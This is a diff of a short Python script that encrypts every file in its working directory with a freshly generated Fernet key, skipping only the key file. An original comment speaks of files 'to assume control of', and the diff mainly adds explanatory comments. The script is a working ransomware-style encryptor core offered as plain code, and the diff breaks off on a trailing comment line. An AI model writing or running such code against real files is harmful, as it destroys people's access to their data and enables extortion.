@@ -2,25 +2,30 @@
 import os
 from cryptography.fernet import Fernet
 
-# finding files to assume control of
-files = [] 
+# create an empty list to store the names of the files to be encrypted
+files = []
 
+# loop through the files in the current directory
 for file in os.listdir():
     if file == "thekey.key":
         continue 
     if os.path.isfile(file):
         files.append(file)
 
+# print the list of files to be encrypted
 print(files)
 
 # generate a new key
 key = Fernet.generate_key()
 
-# rb as in read binary 
+# loop through the files to be encrypted
 for file in files:
+    # open the file in binary read mode
     with open(file, "rb") as thefile:
+        # read the contents of the file
         contents = thefile.read()
+        # encrypt the contents using the generated key
         contents_encrypted = Fernet(key).encrypt(contents)
-# takes file opens files encryptes it and writes it back to the file as a encrypted file
+        # open the file in binary write mode
         with open(file, "wb") as thefile:
-            thefile.write(contents_encrypted) 
+            # write the encrypted contents back
